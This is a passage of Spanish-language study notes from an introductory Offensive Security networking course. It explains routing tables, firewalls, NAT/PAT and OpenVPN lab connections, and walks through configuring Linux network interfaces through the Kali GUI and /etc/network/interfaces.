Según la teoría esta información viene dada por el paquete que contiene la 'DHCP Offer'. De esta forma examinamos el contenido de dicho paquete y encontramos una cabecera que contiene Time Least:

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20221228182729.png' | relative_url }}" text-align="center"/>
</div>

<br />

#### 1.5. Useful Network Technologies.

Esta unidad de aprendizaje cubre varias tecnologías de red importantes, incluidas Routing Tables (las tablas de enrutamiento), Firewalls (los cortafuegos), Network Address Translation (NAT) and Port Address Translation (PAT) and Virtual Private Networks (VPN).

<br />

##### 1.5.1. Routing Tables.

Cuando un host envía datos a otro que se encuentra en una red distinta, esto es que la máquina de destino no está en contacto directo con el router del host fuente, se necesita comunicar al router (enrutador) a dónde enviar los paquetes. Para ello, el enrutador utilizará algo llamado *Routing Table* (Tablas de enrutamiento).

Las tablas de enrutamiento ayudan a las máquinas a determinar cómo pueden enviar información a otros hosts con los que es posible que no tengan una conexión directa. Una tabla de enrutamiento es simplemente una tabla de filas y columnas que contienen información importante sobre los próximos saltos (hops) en la red (cada salto es un router por el que pasan los paquetes hasta llegar a su destino). Una tabla de enrutamiento esencialmente describe un gráfico de cómo su enrutador (o host de red) puede llegar a una variedad de destinos potenciales de la manera más eficiente, utilizando la menor cantidad de saltos posible.

Las tablas de enrutamiento se pueden utilizar para dirigir el tráfico dentro de una red o a través de varias redes. Para este último, las tablas de enrutamiento pueden incluir datos tanto estáticos como dinámicos. Las rutas estáticas son simplemente direcciones codificadas, mientras que las rutas dinámicas las aprende una máquina o un enrutador a través de algún protocolo de red (por ejemplo, DHCP).

Podemos ver las tablas de enrutamiento de las máquinas basadas en Windows y Linux a través del comando: route

```bash
route

Kernel IP routing table
Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
default         192.168.52.254  0.0.0.0         UG    100    0        0 eth0
192.168.52.0    0.0.0.0         255.255.255.0   U     100    0        0 eth0
```

<br />

La primera línea de salida indica que cualquier tráfico recibido por la máquina que no esté en el rango 192.168.52.0/24 se reenvía a la puerta de enlace (Gateway; ) predeterminada, 192.168.52.254. (Sabemos que es /24 porque antes aprendimos que el CIDR de 255.255.255.0 es /24). Esa puerta de enlace luego se encarga de reenviar los paquetes más lejos. Cualquier tráfico destinado a 192.168.52.0/24 se _reenvía_ a 0.0.0.0, lo que significa que el tráfico no viaja más. 0.0.0.0 es una dirección IP especial que generalmente designa un destino desconocido o no enrutable. Sin embargo, su uso en las tablas de enrutamiento indica la ruta predeterminada que debe tomar el tráfico, a menos que se especifique en otra entrada de la tabla.

En otras palabras, nuestra VM puede llegar a cualquier máquina en la subred 192.168.52.0/24. Cualquier máquina en esa subred también puede acceder a ella, todo sin la ayuda de un enrutador, porque pertenecen a la misma clase de red.

Además, no podemos llegar a ninguna otra subred o red directamente. Todo el tráfico generado en la máquina virtual que no coincide específicamente con la segunda línea sale a la puerta de enlace predeterminada. La puerta de enlace predeterminada (un enrutador simple o un firewall) decidirá qué paquetes reenviar y hacia dónde. Discutiremos los cortafuegos en breve.

<br />

**3. Now, connect to the VPN using your own Kali VM, and execute the _route_ command. How many entries are added to the routing table by connecting to the VPN? (provide the number only).**

Podemos ver que al conectarnos a nuestra máquina virtual y observar la Route Table con 'route':

```bash
route -n
Kernel IP routing table
Destination     Gateway         Genmask         Flags Metric Ref   
0.0.0.0         192.168.1.1     0.0.0.0         UG    100    0     
192.168.1.0     0.0.0.0         255.255.255.0   U     100    0     
192.168.49.0    0.0.0.0         255.255.255.0   U     0      0     
192.168.151.0   192.168.49.1    255.255.255.0   UG    0      0     
```

Podemos observar que se han añadido dos rutas correspondientes a dos direcciones distintas, por un lado la ruta a nuestra IP dentro de la VPN y la Gateway demostrando así que ambas direcciones no están en la misma red pues para que el paquete medie entre ambos dispositivos salta a lo largo de varios routers, el nuestro y de ahí al de la VPN.

<br />

##### 1.5.2. Firewalls.

Los Firewalls regulan la entranda o salida de tráfico en un nexo entre redes o dentro de una red, esto es; reciben y luego eliminan o permiten que el tráfico entrante y saliente pase a través de una red según una serie de reglas (rules) que definen los administradores del firewall.

El tipo más común de cortafuegos es el *packet filter*, que básicamente toma cada paquete que recibe y decide si el paquete debe continuar su viaje (o no). Las reglas que utiliza para determinar el destino de cada paquete se capturan en una *Lista de control de acceso* (Access Control List).

Las ACL tienen varias aplicaciones para la seguridad. Por ejemplo, a menudo se utilizan para determinar los permisos en un sistema de archivos o para determinar los niveles de acceso en un dominio de Active Directory. En el contexto de los firewalls, las ACL son simplemente listas de reglas que expresan si un paquete que se origina en alguna fuente y/o se dirige a algún destino debe pasar o no. Hay conjuntos de reglas un poco más complejos disponibles (dependiendo de la implementación) en lugar de simplemente *drop* o *accept*. Por ejemplo, la ACL de un firewalls puede especificar una regla de _rechazo_ , que elimina un paquete dado pero también envía un mensaje al originador para informarle que su paquete fue rechazado.

Los cortafuegos se pueden usar para controlar el tráfico en una máquina en particular o para controlar el tráfico a través de una red. Por ejemplo, el programa *iptables* incluido en Kali y otras distribuciones de Linux es un firewall basado en host que permite al usuario administrar varias reglas que dictan cómo la máquina maneja el tráfico. Veremos cómo usar iptables en un tema posterior.

Los cortafuegos basados ​​en red, por otro lado, también se pueden implementar como software que se ejecuta en un host dedicado, pero también se pueden implementar como dispositivos de hardware independientes especiales.

<br />

##### 1.5.3. Network Address Translation (NAT) and Port Address Translation (PAT).

Anteriormente, mencionamos que las máscaras de subred ayudan a IPv4 a resolver el problema de tener muy pocas direcciones para satisfacer la demanda de Internet. La traducción de direcciones de red (NAT) es otra herramienta utilizada por IPv4 para aumentar la cantidad de direcciones IP posibles.

*NAT funciona mediante la creación de un mapa de uno a muchos entre direcciones IP privadas y direcciones IP públicas en combinación con las máscaras de subred. Primero, analicemos esta noción de direcciones IP privadas. Ciertos rangos del espacio de direcciones IPv4 están reservados para uso privado. Esencialmente, esto significa que cualquier persona puede crear redes privadas usando estas direcciones, porque en sí mismas no se conectan a Internet. Estos rangos son*:

-   10.0.0.0/8

-   172.16.0.0/12

-   192.168.0.0/16

Esta es la razón por la cual las máquinas a las que se conecta a través de Offsec Labs están en el espacio de direcciones 192.168.0.0/16.

Digamos que creamos una red de tres máquinas en la subred 192.168.10.0:

-   M1: 192.168.10.1
   
-   M2: 192.168.10.2

-   M3: 192.168.10.3

Usemos la dirección IP de 192.124.249.5.

Estas máquinas están ubicadas en nuestra red privada, detrás de NAT. Cuando cualquiera de estas máquinas intente conectarse a una dirección IP pública (suponiendo que las reglas de enrutamiento y firewall permitan dicho tráfico), sucederán algunas cosas.

Primero, la máquina (digamos M1) enviará un paquete a su destino previsto, 192.124.249.5. El encabezado del paquete contendrá la propia dirección IP de M1 como origen, así como la dirección IP 192.124.249.5 como destino.

En segundo lugar, la puerta de enlace predeterminada de la red recibirá el paquete. Sobrescribirá la dirección _IP_ de origen con la dirección IP *pública* de la puerta de enlace.

En tercer lugar, la puerta de enlace enviará el paquete modificado a 192.124.249.5. La puerta de enlace también recordará la IP de origen original del paquete, de modo que cuando se reciba cualquier tráfico de retorno, pueda redirigir el tráfico de manera adecuada sobrescribiendo la IP de _destino ._

NAT aumenta considerablemente la cantidad de direcciones que pueden comunicarse en Internet, pero también tiene algunas implicaciones importantes para la seguridad. Dado que la puerta de enlace predeterminada sobrescribirá todas las direcciones IP de origen por su dirección pública, cualquier tráfico que pase a través de la puerta de enlace parece que proviene de la misma puerta de enlace. Esto ayuda a proteger las direcciones IP internas, ya que es difícil para un destino determinado saber cuál es la dirección IP de origen "real". Por otro lado, NAT puede dificultar la atribución del tráfico a los administradores de redes y sistemas _fuera_ de una red privada.

*Port Address Translation (PAT) es una extensión de NAT, donde a cada sistema dentro de una red privada se le asigna un número de puerto específico entre 0 y 65535. Cuando la puerta de enlace de la red recibe un paquete de M1 , sobrescribirá la dirección IP de origen con su propio, tal como lo haría con NAT estándar. Además, también sobrescribirá el puerto de origen con el número de puerto dedicado de M1. De esta manera, el receptor puede diferenciar entre un paquete proveniente de M1 y un paquete proveniente de otra máquina (M3 , por ejemplo), porque sus puertos de origen serán únicos aunque tengan la misma IP.*

<br />

##### 1.5.4. Redes Privadas Virtuales (VPN).

Una _red privada virtual_ (VPN) esencialmente permite la creación de una red privada que actúa como un túnel dedicado dentro de otra red pública (es decir, Internet). Esto puede permitir que los administradores de red alojen, proporcionen y accedan a recursos que no están abiertos a la red pública, al mismo tiempo que mantienen la conectividad de la red pública.

Se puede acceder a una VPN de forma remota a través de varios protocolos de autenticación. Por ejemplo, la VPN utilizada para acceder a los laboratorios emplea autenticación basada en certificados. Aprenderemos más sobre la autenticación basada en certificados en el tema posterior. Las VPN también se pueden configurar para permitir la autenticación tradicional basada en credenciales, así como una combinación de ambas.

Cuando un usuario se autentica en una VPN, su host recibe una nueva interfaz de red virtual. Esa interfaz, normalmente llamada _tun0_ o _tap0_ , se proporciona con una o más rutas a la red privada. El host ahora puede comunicarse con las máquinas que residen en esa red, pendiente de las reglas controladas por el firewall de la VPN.

En Kali, podemos conectarnos a una VPN usando un paquete VPN o un archivo .ovpn . Este archivo contiene varios datos sobre la red, así como los certificados o claves necesarios para conectarse.

Echemos un vistazo a un archivo .ovpn utilizado para conectarse a los laboratorios.

```bash
kali@kali:~$ cat vpn_config.ovpn  -n
     1  persist-tun
     2  persist-key
     3  tls-client
     4  clien
     5  resolv-retry 5
     6  connect-retry-max 1
     7  explicit-exit-notify 1
     8  remote-cert-tls server
     9  nobind
    10  remote-random
    11  dev tun
    12  cipher AES-128-CBC
    13  ncp-ciphers AES-128-GCM
    14  auth SHA1
    15  remote pg-pool1.offseclabs.com 1194 udp
    16  remote pg-pool2.offseclabs.com 1194 udp
    17  verify-x509-name "offensive-security.com" name
    18  <ca>
...
```

Incluso si no sabemos lo que significa cada una de estas líneas, podemos extraer algunas cositas que se destacan. Por ejemplo, podemos saber en la línea 14 qué algoritmo de autenticación está utilizando la VPN, y las líneas 15 y 16 nos dicen a qué nombre de dominio y puerto conectarse.

Podemos conectarnos a la VPN proporcionando al cliente openvpn el nombre del paquete VPN.

```bash
kali@kali:~$ sudo openvpn vpn_config.ovpn
2021-04-27 16:44:27 Note: Treating option '--ncp-ciphers' as  '--data-ciphers' (renamed in OpenVPN 2.5).
2021-04-27 16:44:27 DEPRECATED OPTION: --cipher set to 'AES-128-CBC' but missing in --data-ciphers (AES-128-GCM). Future OpenVPN version will ignore --cipher for cipher negotiations. Add 'AES-128-CBC' to --data-ciphers or change --cipher 'AES-128-CBC' to --data-ciphers-fallback 'AES-128-CBC' to silence this warning.
2021-04-27 16:44:27 OpenVPN 2.5.1 x86_64-pc-linux-gnu [SSL (OpenSSL)] [LZO] [LZ4] [EPOLL] [PKCS11] [MH/PKTINFO] [AEAD] built on Feb 24 2021
2021-04-27 16:44:27 library versions: OpenSSL 1.1.1j  16 Feb 2021, LZO 2.10
2021-04-27 16:44:27 TCP/UDP: Preserving recently used remote address: [AF_INET]142.44.204.172:1194
2021-04-27 16:44:27 UDP link local: (not bound)
2021-04-27 16:44:27 UDP link remote: [AF_INET]142.44.204.172:1194
2021-04-27 16:44:27 [offensive-security.com] Peer Connection Initiated with [AF_INET]142.44.204.172:1194
2021-04-27 16:44:28 TUN/TAP device tun0 opened
2021-04-27 16:44:28 net_iface_mtu_set: mtu 1500 for tun0
2021-04-27 16:44:28 net_iface_up: set tun0 up
2021-04-27 16:44:28 net_addr_v4_add: 192.168.49.130/24 dev tun0
2021-04-27 16:44:28 WARNING: this configuration may cache passwords in memory -- use the auth-nocache option to prevent this
2021-04-27 16:44:28 Initialization Sequence Completed
```

Nota: necesitamos invocar sudo porque la interfaz de red tun0 debe crearse con permisos elevados. Este es el error que recibimos cuando intentamos conectarnos como usuario de kali.

```bash
kali@kali:~$ openvpn vpn_config.ovpn
2021-04-27 18:12:43 Note: Treating option '--ncp-ciphers' as  '--data-ciphers' (renamed in OpenVPN 2.5).
2021-04-27 18:12:43 DEPRECATED OPTION: --cipher set to 'AES-128-CBC' but missing in --data-ciphers (AES-128-GCM). Future OpenVPN version will ignore --cipher for cipher negotiations. Add 'AES-128-CBC' to --data-ciphers or change --cipher 'AES-128-CBC' to --data-ciphers-fallback 'AES-128-CBC' to silence this warning.
2021-04-27 18:12:43 OpenVPN 2.5.1 x86_64-pc-linux-gnu [SSL (OpenSSL)] [LZO] [LZ4] [EPOLL] [PKCS11] [MH/PKTINFO] [AEAD] built on Feb 24 2021
2021-04-27 18:12:43 library versions: OpenSSL 1.1.1j  16 Feb 2021, LZO 2.10
2021-04-27 18:12:43 TCP/UDP: Preserving recently used remote address: [AF_INET]51.222.130.179:1194
2021-04-27 18:12:43 UDP link local: (not bound)
2021-04-27 18:12:43 UDP link remote: [AF_INET]51.222.130.179:1194
2021-04-27 18:12:43 [offensive-security.com] Peer Connection Initiated with [AF_INET]51.222.130.179:1194
2021-04-27 18:12:44 ERROR: Cannot ioctl TUNSETIFF tun: Operation not permitted (errno=1)
2021-04-27 18:12:44 Exiting due to fatal error
```

Sugerencia para la solución de problemas: el cliente OpenVPN no le impedirá conectarse a la misma VPN varias veces. La única indicación que recibirá es que se creará una interfaz de red _tun1_ en lugar de tun0. Esto se puede observar en la salida de openvpn, así como al ejecutar el comando ip .

Las VPN de Offsec no permiten que se produzcan múltiples conexiones del mismo usuario al mismo tiempo. Sin embargo, dado que el _cliente_ puede conectarse a la VPN en momentos arbitrarios, el resultado final es que se puede perder el tráfico y las conexiones pueden ser lentas. Si nota que su conectividad a la VPN responde menos de lo habitual, verifique que no se haya conectado a la VPN a través de varias instancias.

**1.  ¿A qué puerto se conecta la VPN de laboratorios?**

1194

**2.  ¿Cuál es la Unidad de transmisión máxima predeterminada configurada por la VPN de laboratorios?**

1500

**3.  ¿La VPN se conecta por defecto en TCP o UDP?**

UDP porque usualmente es más rápida.

<br />

### 2. Linux Networking & Services.
#### 2.1. Basic Network Enumeration.

La *enumeración* es un proceso por el cual descubrimos información sobre algo, en este caso, un sistema informático. En nuestro caso, queremos identificar información sobre la red de nuestro host Linux. La información de la red puede ser fundamental para determinar cómo funciona un sistema de varias máquinas en conjunto. También es importante comprender nuestra ubicación en la red utilizando información de nuestro host. Comencemos la enumeración determinando nuestra dirección IP.

La forma más sencilla de identificar la dirección IP, la máscara de red, la dirección MAC y otras métricas de red es mediante *ifconfig*.

Sin embargo, no todas las máquinas Linux tienen *ifconfig* instalado. Podríamos usar *which ifconfig* para averiguar si está instalado, o simplemente ejecutar el comando *ifconfig* y buscar un mensaje de error. Intentemos esto ahora.

```
kali@kali:~$ ifconfig
command will not exist on the system. To continue, I entered 'N' to
not install the net-tools package. If it's not possible to install
net-tools on the host, an alternative command can be run: ip addr.
The ip command has many subcommands. This _cheatsheet_[^ipCheatsheet]
should be a great reference for things not covered in this section.
Let's go ahead and run 'ip addr' now.

Command 'ifconfig' not found, but can be installed with:
sudo apt install net-tools
Do you want to install it? (N/y)
```

Debido a que esta máquina no tiene herramientas de red instaladas, el comando *ifconfig* no está disponible en el sistema. Si tenemos los permisos necesarios, podemos instalar el paquete *net-tools* con la utilidad de administrador de paquetes adecuada para la distribución de Linux. De forma predeterminada, Kali viene con *net-tools* e *iproute* instalados.

```
kali@kali:~$ ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.0.2.15  netmask 255.255.255.0  broadcast 10.0.2.255
        inet6 fe80::a00:27ff:fe6b:9fb4  prefixlen 64  scopeid 0x20<link>
        ether 08:00:27:6b:9f:b4  txqueuelen 1000  (Ethernet)
        RX packets 1  bytes 590 (590.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 12  bytes 1212 (1.1 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 8  bytes 400 (400.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 8  bytes 400 (400.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

El comando *ifconfig* proporciona información sobre las interfaces de red en el host que estamos usando

*Ifconfig* es una herramienta heredada en desuso que ha sido reemplazada por la utilidad *ip*. La herramienta *ip* se instala desde el paquete iproute2. Para obtener la misma información, podemos ejecutar *ip addr* . Una versión abreviada común de este comando es *ip a* . En aras de la claridad, usemos *ip addr*.

```
kali@kali:~$ ip addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000                                                     
    link/ether 08:00:27:6b:9f:b4 brd ff:ff:ff:ff:ff:ff
    inet 10.0.2.15/24 brd 10.0.2.255 scope global dynamic noprefixroute eth0
       valid_lft 85996sec preferred_lft 85996sec
    inet6 fe80::a00:27ff:fe6b:9fb4/64 scope link noprefixroute 
       valid_lft forever preferred_lft forever
```

Analicemos los grupos de información de los dos ejemplos de comandos anteriores. Primero, es importante que nos familiaricemos con la interfaz _lo_ [1](https://portal.offensive-security.com/courses/pen-100/books-and-videos/modal/modules/linux-networking-and-services-i/essential-network-utilities/basic-network-enumeration#fn1) o "loopback". Esta interfaz de software prueba la funcionalidad de red del host local.

La dirección IP predeterminada asignada a esta interfaz es *127.0.0.1*, también conocida como *localhost*. Esto significa que la dirección IP de 127.0.0.1 es la misma que 'localhost'. Esta dirección no se puede enrutar en Internet y solo pertenece al host, no a la red. Cualquier enrutamiento construido sobre esta interfaz se enrutará a sí mismo, lo que puede albergar recursos internos en esa máquina.

La siguiente interfaz enumerada en el resultado anterior es *eth0* , abreviatura de la interfaz 'Ethernet'. Esta es la conexión por cable. Los sistemas Linux utilizan un dispositivo y un esquema numérico. En nuestro caso, *esta es la primera interfaz Ethernet, ya que los números de interfaz comienzan en 0*. Si se agregara otra interfaz Ethernet, se mostraría como _eth1_ . Este esquema también se aplica a las interfaces inalámbricas, como _wlan_ , lo que significa que la primera interfaz inalámbrica se mostraría como _wlan0_ .

Al ejecutar comandos en su host, las interfaces que se muestran pueden ser diferentes. Según el tipo de Linux, el esquema de nombres predeterminado de las interfaces puede variar.

La dirección IP del host se define junto a la palabra _inet_ en ambas utilidades, como se destaca en la lista anterior. *ip addr* muestra la máscara de red en *notación CIDR*. La *dirección MAC* se muestra junto a la palabra 'ether'. La dirección MAC es la dirección de hardware físico de la *NIC* en el host. Esto está grabado en el chip, por lo que esta es una dirección que no se puede cambiar. Este valor tiene una longitud de 6 bytes. En Linux, esto se puede encontrar usando delimitadores de dos puntos (:) que separan cada valor de byte. Cada uno de los valores de byte se representa en hexadecimal.

La dirección MAC es una dirección física que no se puede cambiar, a diferencia de una dirección IP, su valor es de 6 bytes de longitud.

En ciberseguridad, el valor de la dirección MAC se usa para mejorar la seguridad a través del direccionamiento *MAC* fijo, que se puede configurar en un conmutador para mejorar la seguridad de la *capa 2* en esa red. Por ejemplo, supongamos que una dirección MAC se almacena como un valor aceptado en un puerto del conmutador. Dado que la dirección MAC es específica de la computadora conectada, el conmutador puede reconocer si una computadora diferente está conectada al puerto configurado. El conmutador podría desactivar ese puerto, lo que ayuda a proteger la red de dispositivos no autorizados.

Estos mecanismos de seguridad no son infalibles y pueden ser víctimas de ataques como la suplantación de identidad de MAC. Sin embargo, los ataques como este están fuera del alcance de este curso, ya que es más importante comprender primero dónde existe la información de la red.

<br />

**Configurando las interfaces de Linux**

Para configurar las interfaces de red, podemos aprovechar la GUI o modificar el archivo **/etc/network/interfaces**. En algunas situaciones, puede ser importante cambiar la dirección IP de nuestro host.

Si nos conectamos a una red que no tiene un servidor DHCP, es posible que necesitemos configurar nuestro host con una dirección IP estática. Familiaricémonos con la GUI de Kali y cambiemos la dirección IP a una IP configurada estáticamente. (Lo volveremos a cambiar al método de red normal, DHCP, cuando hayamos terminado).

<br />

- *GUI*

Para comenzar, haremos clic en el *Kali Menu*. Cuando está abierto, podemos escribir *Network* y observar como se muestra *Advanced Network Configuration* en el panel del menú.

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20230116175357.png' | relative_url }}" text-align="center"/>
</div>

Damos clic en *Advanced Network Configuration*. La ventana *Network Connections* muestra la interfaz Ethernet singular como "Conexión por cable 1" (wired connection). Esto puede mostrarse de manera diferente en otras máquinas.

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20230116175509.png' | relative_url }}" text-align="center"/>
</div>

Esto abre la ventana *Editing Wired Connection 1* para la interfaz que se seleccionó. Por defecto, estamos en la pestaña de *Ethernet*.

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20230116175649.png' | relative_url }}" text-align="center"/>
</div>

Para realizar los cambios de dirección IP, hagamos clic en la pestaña IPv4 Settings.

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20230116175749.png' | relative_url }}" text-align="center"/>
</div>

Este host está configurado para DHCP, que obtendrá la dirección IP automáticamente en una red que tenga un servidor DHCP. Dado que nuestro objetivo es configurar una dirección IP estática (definir manualmente la IP), debemos elegir *Manual* en el menú desplegable *Method*.

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20230116181541.png' | relative_url }}" text-align="center"/>
</div>

Con el "Método manual" seleccionado, a continuación necesitaremos agregar nuestra configuración de IP estática. Al hacer clic en *Add*, podemos escribir en los campos a la izquierda del botón.

Actualicemos nuestra dirección IP a 10.1.1.254 con la máscara de red 255.255.255.0 (o /24 en notación CIDR). A continuación, agregaremos una puerta de enlace predeterminada de 10.1.1.1. Finalmente, podemos agregar un servidor DNS adicional de 8.8.8.8 (un servidor DNS de Google) haciendo clic en el cuadro de texto junto a "Servidores DNS adicionales" e ingresando la dirección IP "8.8.8.8". El DNS se cubrirá con más detalle más adelante.

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20230116175951.png' | relative_url }}" text-align="center"/>
</div>

Cuando haya terminado, haremos clic en el botón *Save* para cerrar la ventana "Editing".

Ahora que la configuración de IP estática está configurada, necesitamos reiniciar la conexión de red. Podemos continuar usando la GUI para esto. En la parte superior derecha, encontraremos un icono de puerto Ethernet. Hagamos clic en esto, luego haga clic en *Disconnect*.

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20230116180419.png' | relative_url }}" text-align="center"/>
</div>

A continuación, tendremos que hacer clic en el mismo icono y seleccionar la interfaz que se configuró en los pasos anteriores.

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20230116180443.png' | relative_url }}" text-align="center"/>
</div>

Desde una sesión de terminal, verifiquemos que esto funcionó en nuestro host. La salida de **ip addr** debería ser muy similar a la salida a continuación.

```
kali@kali:~$ ip addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 08:00:27:6b:9f:b4 brd ff:ff:ff:ff:ff:ff
    inet 10.1.1.254/24 brd 192.168.1.255 scope global noprefixroute eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::a00:27ff:fe6b:9fb4/64 scope link noprefixroute 
       valid_lft forever preferred_lft forever
```

Este ejercicio pretendía mostrar cómo aprovechar la GUI para cambiar nuestra configuración de red de DHCP a una configuración estática. Volvamos a cambiarlo a la configuración DHCP original antes de seguir adelante.

Como hicimos anteriormente, abramos la ventana *Advanced Network Configuration* y hagamos doble clic en la interfaz que modificamos antes. En esta ocasión, seleccionaremos la información de IP que configuramos anteriormente y pulsaremos el botón *Delete* Esto eliminará la configuración estática que establecimos. También necesitamos eliminar la IP del servidor DNS ("8.8.8.8" en nuestro ejemplo).

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20230116181053.png' | relative_url }}" text-align="center"/>
</div>

Una vez eliminada esta información, podemos seleccionar *DHCP (Automatic)* en el menú desplegable *Method*. Con todo revertido, haremos clic en *Save*. Verifiquemos la IP en la terminal nuevamente.

```
kali@kali:~$ ip addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 08:00:27:6b:9f:b4 brd ff:ff:ff:ff:ff:ff
    inet 10.1.1.254/24 brd 192.168.1.255 scope global noprefixroute eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::a00:27ff:fe6b:9fb4/64 scope link noprefixroute 
       valid_lft forever preferred_lft forever
```

La IP no volvió a cambiar a la dirección 10.0.2.15 originalmente asignada como antes. Todavía tiene la dirección IP configurada estáticamente.

Tendremos que reiniciar la conexión de red para que el cambio surta efecto. Después de desconectar y volver a conectar como lo hicimos anteriormente, volvamos a comprobarlo.

```
kali@kali:~$ ip addr
ault qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 08:00:27:6b:9f:b4 brd ff:ff:ff:ff:ff:ff
    inet 10.0.2.15/24 brd 10.0.2.255 scope global dynamic noprefixroute eth0
       valid_lft 86396sec preferred_lft 86396sec
    inet6 fe80::a00:27ff:fe6b:9fb4/64 scope link noprefixroute 
       valid_lft forever preferred_lft forever
```

Trabajar con la GUI no siempre es una opción. 

<br />

- *CLI*.
A menudo, el uso de la Terminal de Linux es una forma más rápida y práctica de realizar cambios de configuración en un sistema Linux. Veamos cómo configurar una interfaz de red a través de la línea de comandos.

En la terminal de Linux, analicemos el archivo /etc/network/interfaces .

```
kali@kali:~$ cat /etc/network/interfaces
# This file describes the network interfaces available on your system
# and how to activate them. For more information, see interfaces(5).

source /etc/network/interfaces.d/*

# The loopback network interface
auto lo
iface lo inet loopback
```

Este es el contenido original del archivo /etc/network/interfaces en nuestro sistema Kali. Notaremos que no hay una referencia a eth0. Esto es administrado por el *NetworkManager* de forma predeterminada, por lo que escribir en el *archivo /etc/network/interfaces* anulará la administración predeterminada y utilizará los ajustes de configuración especificados.

Podemos modificar este archivo para configurar una interfaz de red agregando las siguientes líneas al archivo:

```
allow-hotplug [interface]
iface [interface] inet static
      address [IP]
      netmask [Netmask]
      gateway [Default_Gateway]
```

Reemplazaremos el contenido de la variable anterior con la configuración estática que establecimos en el ejemplo anterior. Cuando haya terminado, el archivo debería aparecer como tal:

```
kali@kali:~$ cat /etc/network/interfaces
# This file describes the network interfaces available on your system
# and how to activate them. For more information, see interfaces(5).

source /etc/network/interfaces.d/*

# The loopback network interface
auto lo
iface lo inet loopback

allow-hotplug eth0
iface eth0 inet static
      address 10.1.1.254
      netmask 255.255.255.0
      gateway 10.1.1.1
```

Ahora, analicemos estos cambios. Primero, la línea *allow-hotplug* habilita la configuración de la interfaz especificada cuando el kernel detecta un evento 'hotplug'. Esto es cuando el estado de un dispositivo (conectado/desconectado) cambia mientras el sistema está funcionando.

El *iface* es la abreviatura de 'interface' (interfaz) e *inet* es el tipo de conexión que se realizará. El tipo de conexión puede ser "estático" o "dhcp" (dinámico).

La línea de *address* contiene la IP deseada para el host.

La *netmask* especifica la máscara de red de la red en la que se encuentra la IP.

La *gateway* es la IP que la red necesita usar para comunicarse con otras redes. Esta sería normalmente la IP del enrutador de la red.

Si ejecutamos *ip addr* nuevamente, aún tendremos la misma dirección IP que antes de nuestro cambio. En el caso de este host, la IP seguirá siendo 10.0.2.15. para que los cambios de configuración que hicimos surtan efecto, tendremos que desactivar la interfaz y volver a activarla. Podemos hacer esto usando el parámetro **ifdown .**

```
kali@kali:~$ sudo ifdown eth0
[sudo] password for kali:
```

A continuación, podemos usar el parámetro **ifup** para recuperar la interfaz.

```
kali@kali:~$ sudo ifup eth0

kali@kali:~$ ip addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 08:00:27:6b:9f:b4 brd ff:ff:ff:ff:ff:ff
    inet 192.168.1.254/24 brd 192.168.1.255 scope global eth0
       valid_lft forever preferred_lft forever
```

Después de reiniciar la interfaz, podemos determinar que la configuración estática tuvo efecto en el host. Cambiemos esto de nuevo a dhcp con una configuración explícita del **archivo /etc/network/interfaces** .

```
kali@kali:~$ cat /etc/network/interfaces
# This file describes the network interfaces available on your system
# and how to activate them. For more information, see interfaces(5).

source /etc/network/interfaces.d/*

# The loopback network interface
auto lo
iface lo inet loopback

